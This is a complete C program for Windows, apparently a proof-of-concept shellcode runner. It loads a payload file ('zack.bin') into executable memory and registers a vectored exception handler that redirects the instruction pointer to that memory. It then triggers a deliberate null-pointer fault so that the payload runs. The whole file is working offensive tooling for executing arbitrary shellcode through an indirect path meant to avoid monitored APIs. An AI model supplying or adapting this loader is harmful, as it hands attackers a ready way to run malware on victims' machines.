#include <Windows.h>
#include <stdio.h>

LPVOID pAddress = NULL;

ULONGLONG Handler(PEXCEPTION_POINTERS pException){
	if (pException->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION){
		pException->ContextRecord->Rip = (ULONGLONG)pAddress;
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_EXECUTION;
}

int main() {
	char *FileName = "zack.bin";
	WINBOOL bStatus; DWORD NumberBytesRead;
	
	printf("[DEBUG] VEH Shellcode Execution\n");
	
	HANDLE hFile = CreateFileA(FileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	
	if (hFile == INVALID_HANDLE_VALUE){
		printf("[DEBUG] CreateFile has failed | %d\n", GetLastError());
		return 1;
	}
	printf("[DEBUG] File %s has been opened\n", FileName);

	DWORD FileSize = GetFileSize(hFile, NULL);
	
	if (FileSize == INVALID_FILE_SIZE){
		printf("[DEBUG] GetFileSize has failed | %d\n", GetLastError());
		return 1;
	}
	printf("[DEBUG] File size is %d bytes\n", FileSize);

	pAddress = VirtualAlloc(NULL, FileSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (!pAddress){
		printf("[DEBUG] VirtualAlloc has failed | %d\n", GetLastError());
		return 1;
	}
	printf("[DEBUG] Address allocated at 0x%p\n", pAddress);

	bStatus = ReadFile(hFile, pAddress, FileSize, &NumberBytesRead, NULL);
	if (bStatus != TRUE){
		printf("[DEBUG] ReadFile has failed | %d\n", GetLastError());
		return 1;
	}
	printf("[DEBUG] %d bytes has been readed and copied at 0x%p\n", NumberBytesRead, pAddress);

	PVOID pVEHAddress = AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)Handler);
	if (!pVEHAddress){
		printf("[DEBUG] AddVectoredExceptionHandler has failed | %d\n", GetLastError());
		return 1;
	}
	printf("[DEBUG] VEH Handler has been added to list exception\n");

	//Exception error :)
	int *i = NULL;
	*i = 1;
}
